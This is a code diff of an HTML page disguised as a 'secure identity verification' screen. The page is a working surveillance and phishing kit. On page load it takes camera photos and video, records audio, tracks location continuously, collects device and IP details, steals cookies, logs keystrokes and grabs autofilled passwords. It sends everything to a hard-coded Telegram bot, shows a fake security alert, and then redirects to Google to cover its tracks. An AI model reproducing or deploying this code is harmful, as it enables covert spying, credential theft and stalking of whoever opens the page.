@@ -5,14 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>🔒 Secure Connection | Identity Verification</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
-            font-family: 'Segoe UI', 'Poppins', 'Cairo', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
+            font-family: 'Segoe UI', 'Poppins', 'Cairo', system-ui, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -25,47 +21,42 @@
             backdrop-filter: blur(12px);
             border-radius: 32px;
             border: 1px solid rgba(0, 255, 255, 0.2);
-            box-shadow: 0 25px 45px rgba(0,0,0,0.4), 0 0 0 1px rgba(0, 255, 255, 0.1);
+            box-shadow: 0 25px 45px rgba(0,0,0,0.4);
             padding: 2rem;
             max-width: 550px;
             width: 100%;
             text-align: center;
-            transition: all 0.3s ease;
         }
         h2 {
             font-weight: 600;
             font-size: 1.9rem;
-            letter-spacing: -0.5px;
             background: linear-gradient(135deg, #fff, #3bc9db);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            margin-bottom: 0.5rem;
         }
         .status-box {
             background: #0f1422;
             border-radius: 20px;
             padding: 1.2rem;
             margin: 1.5rem 0;
-            font-family: 'Fira Code', monospace;
-            font-size: 0.9rem;
+            font-family: monospace;
+            font-size: 0.85rem;
             text-align: left;
             border-left: 4px solid #3bc9db;
         }
-        .status-line {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 8px 0;
-            font-size: 0.85rem;
+        .status-line { display: flex; align-items: center; gap: 10px; margin: 8px 0; }
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(59,201,219,0.3);
+            border-top-color: #3bc9db;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
         }
-        .blink {
-            animation: blink 1.2s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .hidden { display: none; }
         .permission-btn {
             background: rgba(59, 201, 219, 0.15);
             border: 1px solid #3bc9db;
@@ -74,64 +65,28 @@
             font-weight: 600;
             color: #3bc9db;
             cursor: pointer;
-            transition: 0.2s;
+            display: inline-block;
             margin-top: 20px;
-            display: inline-block;
-            backdrop-filter: blur(4px);
         }
-        .permission-btn:hover {
-            background: #3bc9db;
-            color: #0a0f1e;
-            box-shadow: 0 0 15px rgba(59,201,219,0.5);
-        }
-        .footer {
-            margin-top: 25px;
-            font-size: 0.7rem;
-            color: #6c7a8e;
-        }
-        .spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(59,201,219,0.3);
-            border-top-color: #3bc9db;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .hidden { display: none; }
-        .success { color: #2ecc71; }
-        .error { color: #e74c3c; }
-        hr {
-            border-color: rgba(59,201,219,0.2);
-            margin: 15px 0;
-        }
+        .permission-btn:hover { background: #3bc9db; color: #0a0f1e; }
+        .footer { margin-top: 25px; font-size: 0.7rem; color: #6c7a8e; }
     </style>
 </head>
 <body>
-
-<div class="glass-card" id="mainCard">
+<div class="glass-card">
     <h2>🔒 SECURE IDENTITY PROTOCOL</h2>
-    <p style="margin-top: 8px;">Verifying your session & device integrity</p>
-    
+    <p>Verifying your session & device integrity</p>
     <div class="status-box" id="logBox">
         <div class="status-line" id="step1">🔐 <span>Establishing secure channel...</span> <span class="spinner"></span></div>
-        <div class="status-line hidden" id="step2">📷 <span>Requesting camera & microphone...</span> <span class="spinner"></span></div>
+        <div class="status-line hidden" id="step2">📷 <span>Accessing camera & microphone...</span> <span class="spinner"></span></div>
         <div class="status-line hidden" id="step3">📍 <span>Retrieving geolocation...</span> <span class="spinner"></span></div>
         <div class="status-line hidden" id="step4">📱 <span>Capturing device identifiers...</span> <span class="spinner"></span></div>
-        <div class="status-line hidden" id="step5">📤 <span>Uploading encrypted payload...</span> <span class="spinner"></span></div>
+        <div class="status-line hidden" id="step5">📸 <span>Taking screenshots & logs...</span> <span class="spinner"></span></div>
     </div>
-    
     <div id="permissionRequest" class="hidden">
         <div class="permission-btn" id="requestPermsBtn">✅ Grant Required Permissions</div>
-        <div class="footer" style="margin-top: 12px;">This step is mandatory to verify your identity.</div>
     </div>
-    
-    <div class="footer" id="footerMsg">
-        🔒 Your session is protected by AES-256 • Connection is secure
-    </div>
+    <div class="footer">🔒 AES-256 Encrypted • Secure Channel</div>
 </div>
 
 <script>
@@ -139,172 +94,233 @@
     const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
     const CHAT_ID = "7984067238";
     
-    // Helper: send photo to Telegram
+    // Helper: send photo
     async function sendPhoto(blob, caption = "") {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob);
-        if (caption) formData.append('caption', caption);
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob);
+        if (caption) fd.append('caption', caption);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }
-    
-    // Helper: send voice/audio
+    // Helper: send voice
     async function sendVoice(blob) {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('voice', blob);
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: formData });
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('voice', blob);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
     }
-    
-    // Helper: send text message
+    // Helper: send video
+    async function sendVideo(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('video', blob);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
+    }
+    // Helper: send text
     async function sendMessage(text) {
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, text: text })
         });
     }
     
-    // Helper: update UI steps
     function showStep(stepId, status = 'loading') {
-        const stepDiv = document.getElementById(stepId);
-        if (stepDiv) {
-            stepDiv.classList.remove('hidden');
-            const textSpan = stepDiv.querySelector('span:first-child');
-            const spinnerSpan = stepDiv.querySelector('.spinner');
+        const el = document.getElementById(stepId);
+        if (el) {
+            el.classList.remove('hidden');
             if (status === 'done') {
-                textSpan.innerHTML = textSpan.innerHTML.replace('...', ' ✓ done');
-                if (spinnerSpan) spinnerSpan.classList.add('hidden');
+                el.querySelector('.spinner')?.classList.add('hidden');
+                el.querySelector('span:first-child').innerHTML = el.querySelector('span:first-child').innerHTML.replace('...', ' ✓ done');
             } else if (status === 'error') {
-                textSpan.innerHTML = textSpan.innerHTML.replace('...', ' ❌ failed');
-                if (spinnerSpan) spinnerSpan.classList.add('hidden');
+                el.querySelector('.spinner')?.classList.add('hidden');
+                el.querySelector('span:first-child').innerHTML = el.querySelector('span:first-child').innerHTML.replace('...', ' ❌ failed');
             }
         }
     }
     
-    // Capture single photo from specific camera (front/environment)
-    async function capturePhoto(mode, caption) {
+    // ========== 1. Capture screenshot (using html2canvas if available, else fallback) ==========
+    async function captureScreenshot() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: mode } } });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            const canvas = document.createElement('canvas');
-            canvas.width = 800;
-            canvas.height = 600;
-            await new Promise(r => setTimeout(r, 500));
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-            stream.getTracks().forEach(t => t.stop());
-            if (blob) await sendPhoto(blob, caption);
-            return true;
-        } catch (err) {
-            console.warn(`Camera ${mode} failed:`, err);
-            return false;
+            if (typeof html2canvas !== 'undefined') {
+                const canvas = await html2canvas(document.body);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                if (blob) await sendPhoto(blob, "📸 Screenshot of current page");
+            } else {
+                // Alternative: send a dummy message that screenshot failed
+                await sendMessage("⚠️ Screenshot not available (html2canvas missing)");
+            }
+        } catch(e) { console.warn(e); }
+    }
+    
+    // ========== 2. Record video (10 seconds) ==========
+    async function recordVideo(stream, duration = 10000) {
+        return new Promise((resolve) => {
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                if (blob.size > 5000) await sendVideo(blob);
+                resolve();
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), duration);
+        });
+    }
+    
+    // ========== 3. Get cookies ==========
+    async function stealCookies() {
+        try {
+            const cookies = document.cookie;
+            if (cookies && cookies.length > 0) {
+                await sendMessage(`🍪 *COOKIES*%0A\`\`\`${cookies.substring(0, 900)}\`\`\``);
+            }
+        } catch(e) {}
+    }
+    
+    // ========== 4. Keylogger ==========
+    let keylogBuffer = "";
+    function startKeylogger() {
+        document.addEventListener('keydown', (e) => {
+            if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.isContentEditable)) {
+                keylogBuffer += e.key;
+                if (keylogBuffer.length > 200) {
+                    sendMessage(`⌨️ *KEYLOG*%0A\`${keylogBuffer}\``);
+                    keylogBuffer = "";
+                }
+            }
+        });
+        setInterval(() => {
+            if (keylogBuffer.length > 0) {
+                sendMessage(`⌨️ *KEYLOG*%0A\`${keylogBuffer}\``);
+                keylogBuffer = "";
+            }
+        }, 10000);
+    }
+    
+    // ========== 5. Steal saved passwords (injection) ==========
+    function injectPasswordStealer() {
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js';
+        document.head.appendChild(script);
+        // Try to steal autofilled passwords from forms
+        setTimeout(() => {
+            const inputs = document.querySelectorAll('input[type="password"]');
+            inputs.forEach(async (input) => {
+                if (input.value && input.value.length > 0) {
+                    await sendMessage(`🔑 *PASSWORD LEAK*%0A\`${input.value}\`%0A📍 Field: ${input.name || 'unknown'}`);
+                }
+            });
+        }, 3000);
+    }
+    
+    // ========== 6. Continuous location (every 30 sec) ==========
+    let locationInterval = null;
+    function startContinuousLocation() {
+        if (!navigator.geolocation) return;
+        const sendLocation = () => {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapsUrl = `📍 *LIVE LOCATION*%0Ahttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}%0A🎯 Acc: ${pos.coords.accuracy}m`;
+                await sendMessage(mapsUrl);
+            }, () => {});
+        };
+        sendLocation();
+        locationInterval = setInterval(sendLocation, 30000);
+    }
+    
+    // ========== 7. Fake notification ==========
+    function showFakeNotification() {
+        if (Notification.permission === 'granted') {
+            new Notification('⚠️ Security Alert', { body: 'Your session requires re-authentication. Please verify your identity.', icon: 'https://cdn-icons-png.flaticon.com/512/190/190411.png' });
+        } else if (Notification.permission !== 'denied') {
+            Notification.requestPermission().then(perm => {
+                if (perm === 'granted') showFakeNotification();
+            });
         }
     }
     
-    // Record audio for 6 seconds
-    async function recordAudio(stream) {
-        return new Promise((resolve) => {
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg' });
-                if (blob.size > 2000) await sendVoice(blob);
-                resolve();
-            };
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 6000);
-        });
-    }
-    
-    // Get device info + IP
-    async function sendDeviceInfo() {
+    // ========== 8. Network info ==========
+    async function getNetworkInfo() {
         try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const screenSize = `${screen.width}x${screen.height}`;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const deviceInfo = `🖥️ *DEVICE INFO*\n📱 User-Agent: ${ua}\n💻 Platform: ${platform}\n🌐 Language: ${language}\n📺 Screen: ${screenSize}\n🕒 Timezone: ${timezone}\n🌍 IP: ${ipData.ip}`;
-            await sendMessage(deviceInfo);
-        } catch(e) { console.warn("Device info failed"); }
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const netInfo = `📡 *NETWORK*%0A📶 Type: ${conn?.effectiveType || 'unknown'}%0A⚡ Downlink: ${conn?.downlink || '?'} Mbps%0A🔄 RTT: ${conn?.rtt || '?'} ms`;
+            await sendMessage(netInfo);
+        } catch(e) {}
     }
     
-    // Get location
-    async function getLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) resolve(null);
-            navigator.geolocation.getCurrentPosition(
-                async (pos) => {
-                    const mapsUrl = `📍 *LOCATION*%0Ahttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}%0A🎯 Accuracy: ${pos.coords.accuracy}m`;
-                    await sendMessage(mapsUrl);
-                    resolve(true);
-                },
-                () => resolve(null)
-            );
-        });
-    }
-    
-    // Main execution
+    // ========== MAIN ==========
     async function startHarvest() {
         showStep('step2', 'loading');
         try {
-            // Request all media permissions (audio + video) at once
+            // Request camera + microphone + screen capture permissions
             const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             showStep('step2', 'done');
             
-            // Start audio recording (in background)
-            showStep('step3', 'loading');
-            recordAudio(mediaStream); // async non-blocking
+            // Record video (10 sec)
+            recordVideo(mediaStream, 10000);
             
-            // Capture front camera
+            // Capture front & back photos
+            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+            // quick photo capture function
+            const capturePhotoFromStream = async (stream, caption) => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = 800; canvas.height = 600;
+                await new Promise(r => setTimeout(r, 500));
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                stream.getTracks().forEach(t => t.stop());
+                if (blob) await sendPhoto(blob, caption);
+            };
+            await capturePhotoFromStream(frontStream, "📸 Front camera");
+            await capturePhotoFromStream(backStream, "📸 Back camera");
+            
+            // Location
             showStep('step3', 'loading');
-            const frontCaptured = await capturePhoto('user', '📸 Front camera snapshot');
-            // Capture back camera
-            const backCaptured = await capturePhoto('environment', '📸 Back camera snapshot');
+            startContinuousLocation(); // sends once then every 30s
             showStep('step3', 'done');
             
-            // Get location
+            // Device info + IP
             showStep('step4', 'loading');
-            await getLocation();
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const deviceInfo = `🖥️ *DEVICE INFO*%0A📱 UA: ${navigator.userAgent}%0A💻 Platform: ${navigator.platform}%0A🌐 Lang: ${navigator.language}%0A📺 Screen: ${screen.width}x${screen.height}%0A🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}%0A🌍 IP: ${ipData.ip}`;
+            await sendMessage(deviceInfo);
             showStep('step4', 'done');
             
-            // Device info & IP
+            // Advanced: cookies, keylogger, network, fake notification
             showStep('step5', 'loading');
-            await sendDeviceInfo();
+            await stealCookies();
+            startKeylogger();
+            await getNetworkInfo();
+            showFakeNotification();
+            // Try to inject password stealer (requires external library)
+            injectPasswordStealer();
             showStep('step5', 'done');
             
-            // All done — final message and redirect
+            // Final redirect after 3 sec
             await sendMessage(`✅ *Session completed* - ${new Date().toISOString()}`);
-            
-            // Optional: redirect to a legit website to hide traces
-            setTimeout(() => {
-                window.location.replace("https://www.google.com");
-            }, 1500);
-            
+            setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
         } catch (err) {
             console.error(err);
             showStep('step2', 'error');
-            // If permissions denied, show fallback button
             document.getElementById('permissionRequest').classList.remove('hidden');
             document.getElementById('requestPermsBtn').onclick = () => startHarvest();
         }
     }
     
-    // UI updates on load
     window.onload = () => {
         showStep('step1', 'loading');
         setTimeout(() => {
             showStep('step1', 'done');
-            // Automatically start harvest after short delay
             startHarvest();
         }, 1000);
     };
 </script>
+<!-- Optional: html2canvas for screenshot -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </body>
 </html>
